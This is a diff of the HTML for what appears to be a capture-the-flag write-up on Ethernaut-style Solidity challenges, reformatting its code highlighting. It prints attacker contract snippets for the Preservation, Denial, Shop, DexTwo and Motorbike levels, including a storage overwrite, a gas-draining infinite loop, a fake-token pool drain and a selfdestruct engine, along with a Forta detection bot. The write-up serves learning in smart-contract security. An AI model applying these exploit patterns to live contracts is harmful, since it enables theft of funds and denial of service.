 </ul>
-<pre class=" language-cs"><code class="prism  language-cs">function setFirstTimeExploit() external {
-    preservationContract.setFirstTime(uint256(address(this)));
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">setFirstTimeExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span>
+    preservationContract<span class="token punctuation">.</span><span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>Where <code>preservationContract</code> is an interface to the Preservation contract.</p>
 <p>Therefore the flow is as follows:</p>
@@ -1109,28 +1109,28 @@ address public owner;
 <li>I first needed to look for help as I had absolutely no idea how to approach this problem, but after extensive reading of how this whole thing works and some basics of opcodes and EVM assembly, I then decided to code a contract using Yul (deployed at: <code>0x678a4e09ec08d8fd32abc0f4e3e28469fe8b6e80</code>), which IMO is a very readable way of attempting to do this.</li>
 </ol>
 <p>The contract looks like this (It’s under <code>/contracts/attacks/MagicNumberSolver.Yul</code> in the repo):</p>
-<pre class=" language-cs"><code class="prism  language-cs">// SPDX-License-Identifier: MIT
-object "MagicNumberSolver" {
-    code {
-        sstore(0, caller())
-        datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
-        return(0, datasize("Runtime"))
-    }
-    object "Runtime" {
-        code {
-            mstore(0x0, 0x2a)
-            return(0x0, 0x20)    
-        }
-    }
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+object <span class="token string">"MagicNumberSolver"</span> <span class="token punctuation">{</span>
+    code <span class="token punctuation">{</span>
+        <span class="token function">sstore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token function">datacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">dataoffset</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    object <span class="token string">"Runtime"</span> <span class="token punctuation">{</span>
+        code <span class="token punctuation">{</span>
+            <span class="token function">mstore</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>    
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>This is a <em>million times</em> more readable than raw bytecode or even raw opcodes, though now raw opcodes no longer look like robot instructions to me (even though they technically are).</p>
 <p>This is the constructor of the contract (initialization opcodes), usually declared with <code>constructor()</code> in Solidity:</p>
-<pre class=" language-cs"><code class="prism  language-cs">code {
-    sstore(0, caller())
-    datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
-    return(0, datasize("Runtime"))
-}
+<pre class=" language-js"><code class="prism  language-js">code <span class="token punctuation">{</span>
+    <span class="token function">sstore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token function">datacopy</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">dataoffset</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">datasize</span><span class="token punctuation">(</span><span class="token string">"Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>This code basically stores the <code>caller()</code> in slot 0 and copies the contract code (“Runtime”) to it (<code>datacopy()</code>) and specifying the size of the contract code (<code>datasize()</code>) and the offset (<code>dataoffset()</code>). The name of the object containing the code (in my case “Runtime”) can be anything, it simply serves as a way to refer to it through functions like <code>datasize()</code>, which take a string of the name of a Yul object. The return opcode concludes the runtime of the constructor.</p>
 <p>And this is the code of the contract itself after deployment (runtime opcodes), what is stored on the blockchain:</p>
@@ -1240,15 +1240,15 @@ owner_hash <span class="token operator">=</span> <span class="token builtin">hex
 <ol>
 <li>I coded and deployed (at: <code>0x5708A3c4d9472B9D6951200c6d6C2FB82ef96c50</code>) an attacker contract with a <code>receive()</code> fallback function defined as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">receive() external payable {
-    while (true) {
-        foreverLooping += 1;
-        if (foreverLooping &gt; 0) {foreverLooping = 0;}
-    }
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        foreverLooping <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>foreverLooping <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>foreverLooping <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>Where <code>foreverLooping</code> is a state variable:</p>
-<pre class=" language-cs"><code class="prism  language-cs">uint256 private foreverLooping;
+<pre class=" language-js"><code class="prism  language-js">uint256 <span class="token keyword">private</span> foreverLooping<span class="token punctuation">;</span>
 </code></pre>
 <p>In python:</p>
 <pre class=" language-python"><code class="prism  language-python">denialattack <span class="token operator">=</span> DenialAttack<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>denial<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
@@ -1256,9 +1256,9 @@ owner_hash <span class="token operator">=</span> <span class="token builtin">hex
 <ol start="2">
 <li>I made the contract <code>partner</code> through a function inside the contract I defined which calls <code>setWithdrawPartner()</code> in Denial through an interface:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">function setThisAsWithdrawPartner() public {
-    denialContract.setWithdrawPartner(address(this));
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">setThisAsWithdrawPartner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    denialContract<span class="token punctuation">.</span><span class="token function">setWithdrawPartner</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>Where <code>denialContract</code> is the interface object.</p>
 <p>In python:</p>
@@ -1295,13 +1295,13 @@ owner_hash <span class="token operator">=</span> <span class="token builtin">hex
 <ol>
 <li>Code and deploy a Buyer contract (at: <code>0xB9dcacbc393D15fEa292705d66c1549035CcB3ee</code>) where I define the <code>price()</code> function as follows:</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">function price() public view returns (uint256) {
-    if (shopContract.isSold()) {
-        return 1;
-    } else {
-        return 100;
-    }
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span>uint256<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>shopContract<span class="token punctuation">.</span><span class="token function">isSold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>If <code>isSold</code> is true, the price gets overwritten by a 1, however, in the if statement, we pass the check (requiring <code>price()</code> to return 100) since <code>isSold</code> is still false.</p>
 <p>In python:</p>
@@ -1542,7 +1542,7 @@ balance_assertion <span class="token operator">=</span> <span class="token punct
 <p>You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.</p>
 <h3 id="solution-21">Solution</h3>
 <p>The DexTwo problem suffers from a different problem to the Dex problem. In this case, there is no require statement checking whether the two token contract addresses being swapped actually match the two token contract addresses for which the pool is designed. As correctly defined in the Dex contract, this line is missing:</p>
-<pre class=" language-cs"><code class="prism  language-cs">require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), "Invalid tokens");
+<pre class=" language-js"><code class="prism  language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Invalid tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
 <p>As a result of this, we can code another ERC20 token contract of which we mint the entire supply to our wallet and with just a few of these we can drain both sides of the pool as follows:</p>
 <ol>
@@ -1757,9 +1757,9 @@ eg<span class="token punctuation">.</span>initialize<span class="token punctuati
 <ol start="3">
 <li>Deploy a BombEngine contract (at: <code>0x89a05702875f0c18FF5B28640ea3DdE39FDe6E47</code>) with only a single function that can self destruct such contract</li>
 </ol>
-<pre class=" language-cs"><code class="prism  language-cs">function boom() public {
-    selfdestruct(address(0));
-}
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">boom</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token function">selfdestruct</span><span class="token punctuation">(</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <pre class=" language-python"><code class="prism  language-python"><span class="token comment"># deploy our bomb engine contract</span>
 be <span class="token operator">=</span> BombEngine<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>_from<span class="token punctuation">)</span>
@@ -1834,36 +1834,36 @@ cryptovault_address <span class="token operator">=</span> dep<span class="token 
 <li>Code and deploy (at: <code>0xA662bD0c21450a80c5B3fCA07709771Eb720EcB6</code>) DetectionBot contract that raises an alert if the CryptoVault address is found in the calldata when <code>sweepToken()</code> is called. I decided to code this using a loop which goes over every offset of the calldata (up until a max of the total size of the calldata in bytes, in this case 228 bytes). I recognize this is less efficient than simply figuring out where <code>origSender</code> is in the calldata, but I wanted to try solving the problem how I would otherwise do it in a different programming language that I’m more familiar with. This is a sort of ‘bruteforce’ type way to find it, but for the time being, I’m okay with that.</li>
 </ol>
 <p>That said, I coded the <code>handleTransaction()</code> function as follows:</p>
-<pre class=" language-cs"><code class="prism  language-cs">function handleTransaction(address user, bytes calldata) public override {
-    uint dataValue;
-    uint calldataloadPos = 4;
-    uint _calldatasize;
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">handleTransaction</span><span class="token punctuation">(</span>address user<span class="token punctuation">,</span> bytes calldata<span class="token punctuation">)</span> <span class="token keyword">public</span> override <span class="token punctuation">{</span>
+    uint dataValue<span class="token punctuation">;</span>
+    uint calldataloadPos <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+    uint _calldatasize<span class="token punctuation">;</span>
 
-    // get calldata size (in bytes) so the loop ends where the data ends
-    assembly {
-        _calldatasize := calldatasize()
-    }
+    <span class="token comment">// get calldata size (in bytes) so the loop ends where the data ends</span>
+    assembly <span class="token punctuation">{</span>
+        _calldatasize <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">calldatasize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
 
-    while (calldataloadPos &lt; _calldatasize) {
-        // obtain the next 32-byte item from the calldata
-        assembly {
-            dataValue := calldataload(calldataloadPos)
-        }
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>calldataloadPos <span class="token operator">&lt;</span> _calldatasize<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">// obtain the next 32-byte item from the calldata</span>
+        assembly <span class="token punctuation">{</span>
+            dataValue <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">calldataload</span><span class="token punctuation">(</span>calldataloadPos<span class="token punctuation">)</span>
+        <span class="token punctuation">}</span>
 
-        // check if the address is present in the next 32 byte slot
-        if (dataValue == uint256(uint160(cryptoVault))) {
-            // raise alert if address is present in calldata
-            forta.raiseAlert(user);
-            break;
+        <span class="token comment">// check if the address is present in the next 32 byte slot</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>dataValue <span class="token operator">==</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">uint160</span><span class="token punctuation">(</span>cryptoVault<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment">// raise alert if address is present in calldata</span>
+            forta<span class="token punctuation">.</span><span class="token function">raiseAlert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
 
-        } else {
-            // add one to calldataloadpos
-            assembly {
-                calldataloadPos := add(calldataloadPos, 0x1)
-            }
-        }
-    }
-}
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token comment">// add one to calldataloadpos</span>
+            assembly <span class="token punctuation">{</span>
+                calldataloadPos <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>calldataloadPos<span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <p>The deployment is done in python as follows:</p>
 <pre class=" language-python"><code class="prism  language-python">bot <span class="token operator">=</span> DetectionBot<span class="token punctuation">.</span>deploy<span class="token punctuation">(</span>cryptovault_address<span class="token punctuation">,</span> forta<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
